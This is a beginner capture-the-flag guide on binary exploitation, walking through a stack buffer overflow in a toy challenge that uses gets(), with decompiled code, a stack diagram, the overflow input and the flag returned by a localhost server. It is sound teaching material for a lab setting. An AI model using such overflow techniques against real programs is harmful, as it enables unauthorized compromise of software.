# Binary Exploitation / Pwn
Binary Exploitation of *Pwn* are problems on which the contestants are challenged to *hack* a program. One main thing to notice is that in this type of problems, the contestants are  given a connection to the remote challenge server, so **the flag is not on the program itself** but somewhere in the remote server. The usual way of solving binary exploitation problems is to hack and debug the program on your local machine first (may involve writing a fake flag), writing a script to do the same thing to the remote server, then executing the script. Pwn problems are mostly binary (ELF/Compiled C) program exploitation. Typical vulnerabilities in these programs include buffer overflow, format string attack, integer overflow, heap exploitation and more.

## Tools
The tools you might need to solve Pwn problems:
- Debugger ([gdb](http://www.gdbtutorial.com/tutorial/how-install-gdb), [gdb-peda](https://github.com/longld/peda)) - to RE compiled programs.
- Disassembler ([IDA](https://www.hex-rays.com/products/ida/), [Ghidra](https://ghidra-sre.org/), etc.) - to RE compiled programs.
- Scripting tool ([pwntools](https://github.com/Gallopsled/pwntools)) - to automate input to the program.
- etc.

## Example Problem
You can find the file [here](./example/README.md).

Follow the instruction to setup the remote server.

Notice that in the **real** CTF, the contestants are only given the [binary](./chall/bof0) and the connection to the remote server. This binary program is the exact same program running on the server.

*If you want to run the challenge with docker you may need to install [docker](https://www.docker.com/) and [docker-compose](https://docs.docker.com/compose/install/) on your machine.*


## How to Solve
### Observation

First off, try connecting to the *remote* server:
```
$ nc localhost 10001
```
```
hi! change the string variable to h3h3 and you'll get your flag!
your input: 
```
*You can close the connection with **Ctrl-C***

Try the program locally:
```
$ ./bof
```
```
hi! change the string variable to h3h3 and you'll get your flag!
your input: 
```
The program asks for an input, if our input changes the local variable from 'stif' to 'h3h3', we get the flag.

To understand the program better, let's open it up in IDA (or gdb if you are hardcore).

Launch IDA, load the program, and disassemble the main function (F5).
```
  ...
  setbuf(_bss_start, 0LL);
  puts("hi! change the string variable to h3h3 and you'll get your flag!");
  vuln();
  exit(0);
}
```

Seems that the main function calls the `vuln()` function, let's disassemble that function.
```
  ...
  char v1; // [rsp+8h] [rbp-18h]
  char s1[8]; // [rsp+10h] [rbp-10h] 	<- allocation
  ...

  ...
  *(_QWORD *)s1 = 0x66697473LL;			<- s1 = 'stif' (or 0x66697473LL in hex)
  printf("your input: ");
  gets(&v1); 							<- our input!!!
  printf("string is: %s\n", s1);
  if ( !strcmp(s1, "h3h3") )			<- compare s1 to h3h3
  {
    puts("congrats! here's your flag");
    readFlag(); 						<- this function reads the flag
  }
  ...
}
```

From that disassembled code, we know that the program asks for our input **USING `gets()`**, store it in v1, and then compares s1 (which is not our input) to "h3h3".

At first this may seem impossible, how can we change a pre-initialized variable given our control to another variable. The key is on how the program asks for our input, using `gets()`. The function `gets()` is an unsafe function that **DOESN'T LIMIT THE CHARACTER ENTERED**, this means that we can bypass the initially allocated space for our input. You can see how `v1` and `s1` are allocated on the header of the disassembled function in IDA.

Here is an illustration on how the variables `v1` and `s1` are allocated (in reference to `rbp`). Keep in mind that in C, 1 character = 1 byte.
```
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
|   |   |   |   |   |   |   |   | s | t | i | f |   |   |   |   | -> rbp
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
 -18 -17 -16 -15 -14 -13 -12 -11 -10 -0f -0e -0d -0c -0b -0a -09
  |____________v1_____________|   |_____________s1____________|
```

So, to change `s1` to 'h3h3', we need to input any 8 characters (from rbp-0x18 to rbp-0x11) plus 'h3h3' itself. The following illustration pictures the input 'GANTENGZh3h3'.
```
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| G | A | N | T | E | N | G | Z | h | 3 | h | 3 |   |   |   |   | -> rbp
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
 -18 -17 -16 -15 -14 -13 -12 -11 -10 -0f -0e -0d -0c -0b -0a -09
  |____________v1_____________|   |_____________s1____________|
```

Now try inputing the payload to the program locally.
```
$ ./bof
```
```
hi! change the string variable to h3h3 and you'll get your flag!
your input: GANTENGZh3h3
congrats! here's your flag
Segmentation fault (core dumped)
```

You will not get the flag this way because the program is being run locally in your machine, hence the `SEGFAULT`.
Try connecting to the server and input the payload.
```
$ nc localhost 10001
```
```
hi! change the string variable to h3h3 and you'll get your flag!
your input: GANTENGZh3h3
congrats! here's your flag
CTFGUIDE{3z_b0o00ooo0ff}
```

---

## External Resources
*TBD*